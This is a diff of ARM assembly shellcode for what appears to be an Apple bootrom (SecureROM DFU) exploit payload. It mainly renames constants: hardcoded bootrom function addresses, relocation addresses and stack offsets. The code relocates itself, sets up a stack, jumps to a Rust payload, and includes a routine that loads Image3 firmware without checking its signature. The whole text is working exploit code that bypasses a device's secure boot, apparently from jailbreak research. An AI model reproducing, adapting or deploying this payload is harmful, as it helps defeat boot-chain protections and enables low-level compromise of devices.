@@ -1,30 +1,17 @@
 .text
 
 .pool
-.set free,                          0x3b95
-.set memz_create,                   0x7469
-.set memz_destroy,                  0x7451
-.set image3_create_struct,          0x412d
-.set image3_load_continue,          0x46db
-.set image3_load_fail,              0x47db
-.set usb_wait_for_image,            0x4c85
-.set jump_to,                       0x5a5d
-.set nor_power_on,                  0x4e8d
-.set nor_init,                      0x690d
-.set memmove,                       0x84dc
-.set strlcat,                       0x90c9
+.set FUNC_ADDR_IMAGE3_CREATE_STRUCT,      0x412d
+.set FUNC_ADDR_IMAGE3_LOAD_CONTINUE,      0x46db
+.set FUNC_ADDR_MEMMOVE,                   0x84dc
 
-.set gLeakingDFUBuffer,             0x8402dbcc
-.set gUSBSerialNumber,              0x8402e0e0
+.set RELOCATED_PAYLOAD_BASE,              0x84039800
+.set RELOCATED_PAYLOAD_SIZE,              1024
+.set PAYLOAD_STACK_ADDR,                  0x8403c000
+.set MAX_DFU_IMAGE_SIZE,                  0x2c000
 
-.set relocated_payload_addr,    0x84039800
-.set relocated_payload_size,       1024
-.set    stack_address, 0x8403c000
-.set LOAD_ADDRESS,                  0x84000000
-.set MAX_SIZE,                      0x2c000
-.set EXEC_MAGIC,                    0x65786563
-.set IMAGE3_LOAD_SP_OFFSET,         0x68
-.set IMAGE3_LOAD_STRUCT_OFFSET,     0x64
+.set IMAGE3_LOAD_SP_OFFSET,               0x68
+.set IMAGE3_LOAD_STRUCT_OFFSET,           0x64
 
 .extern _c_entry_point
 
@@ -45,17 +32,17 @@ relocate_shellcode:
     @ Are we already running from the relocated shellcode?
     mov r1, pc
     sub r1, r1, #4
-    ldr r0, =relocated_payload_addr
+    ldr r0, =RELOCATED_PAYLOAD_BASE
     cmp r0, r1
     beq continue_relocated
 
     @ Relocate the payload now
-    ldr r2, =relocated_payload_size
-    ldr r3, =memmove
+    ldr r2, =RELOCATED_PAYLOAD_SIZE
+    ldr r3, =FUNC_ADDR_MEMMOVE
     @ memmove(relocated_payload_addr, pc_base, relocated_payload_size)
     blx r3
 
-    ldr r3, =relocated_payload_addr
+    ldr r3, =RELOCATED_PAYLOAD_BASE
     @ THUMB
     add r3, r3, #1
     @ Jump to relocated shellcode
@@ -63,71 +50,68 @@ relocate_shellcode:
 
 continue_relocated:
     @ Set up a stack
-    ldr r0, =stack_address
+    ldr r0, =PAYLOAD_STACK_ADDR
     mov sp, r0
     @ Jump to ARM for compatibility with the Rust payload, which always targets ARM
-    blx _continue_loop
+    blx continue_arm
 
 .code 32
 .align 4
-.global _continue_loop
-.global _image3_load_no_signature_check
-_continue_loop:
+continue_arm:
     @ Our Rust always targets ARM, so switch modes
     blx _receive_and_jump_to_image
 
-    LDR R1, =LOAD_ADDRESS
-    MOV R2, #0
-    LDR R3, =jump_to
-    BLX R3                                      @ jump_to(0, LOAD_ADDRESS, 0)
-
-    /* jump_to should never return */
-
 .global _image3_load_no_signature_check
 _image3_load_no_signature_check:
-    PUSH {R4-R7, LR}                            @ push_registers(R4, R5, R6, R7, LR)
+    push {r4-r7, lr}
 
-    MOV R6, R11
-    MOV R5, R10
-    MOV R4, R8
-    PUSH {R4-R6}                                @ push_registers(R8, R10, R11)
+    mov r6, r11
+    mov r5, r10
+    mov r4, r8
+    push {r4-r6}
 
-    ADD R7, SP, #0x18                           @ R7 = SP - 0x18
+    @ r7 = sp - 018
+    add r7, sp, #0x18
 
-    LDR R4, =IMAGE3_LOAD_SP_OFFSET
-    MOV R5, SP
-    SUB R5, R5, R4
-    MOV SP, R5                                  @ SP = SP - IMAGE3_LOAD_SP_OFFSET
+    @ sp -= IMAGE3_LOAD_SP_OFFSET
+    ldr r4, =IMAGE3_LOAD_SP_OFFSET
+    mov r5, sp
+    sub r5, r5, r4
+    mov sp, r5
 
-    MOV R3, #0
-    LDR R4, =IMAGE3_LOAD_STRUCT_OFFSET
-    ADD R4, R5, R4
-    STR R3, [R4]                                @ *(SP + IMAGE3_LOAD_STRUCT_OFFSET) = 0
+    @ *(sp + IMAGE3_LOAD_STRUCT_OFFSET) = 0
+    mov r3, #0
+    ldr r4, =IMAGE3_LOAD_STRUCT_OFFSET
+    add r4, r5, r4
+    str r3, [r4]
 
-    STR R2, [SP, #0x10]                         @ SP[4] = R2
+    @ sp[4] = r2
+    str r2, [sp, #0x10]
+    @ sp[5] = r1
+    str r1, [sp, #0x14]
+    @ sp[6] = 0
+    str r3, [sp, #0x18]
+    @ r6 = *r1
+    ldr r6, [r1]
 
-    STR R1, [SP, #0x14]                         @ SP[5] = R1
+    mov r10, r1
+    mov r11, #0
 
-    STR R3, [SP, #0x18]                         @ SP[6] = 0
+    @ r8 = MAX_DFU_IMAGE_SIZE
+    ldr r1, =MAX_DFU_IMAGE_SIZE
+    mov r8, r1
 
-    LDR R6, [R1]                                @ R6 = *R1
+    @ r8 = r0[1]
+    ldr r2, [r0, #4]
+    mov r8, r2
 
-    MOV R10, R1                                 @ R10 = R1
-
-    MOV R11, R3                                 @ R11 = 0
-
-    LDR R1, =MAX_SIZE
-    MOV R8, R1                                  @ R8 = MAX_SIZE
-
-    LDR R2, [R0, #4]
-    MOV R8, R2                                  @ R8 = R0[1]
-
-    MOV R0, R4
-    MOV R1, R6
-    LDR R4, =image3_create_struct
-    BLX R4
-    MOV R4, R0                                  @ R4 = image3_create_struct(SP + IMAGE3_LOAD_STRUCT_OFFSET, R6, R8, 0)
+    @ r4 = image3_create_struct(sp + IMAGE3_LOAD_STRUCT_OFFSET, r6, r8, 0)
+    mov r0, r4
+    mov r1, r6
+    ldr r4, =FUNC_ADDR_IMAGE3_CREATE_STRUCT
+    blx r4
+    mov r4, r0
 
     @ image3_load_continue()
-    ldr r3, =image3_load_continue
+    ldr r3, =FUNC_ADDR_IMAGE3_LOAD_CONTINUE
     bx r3
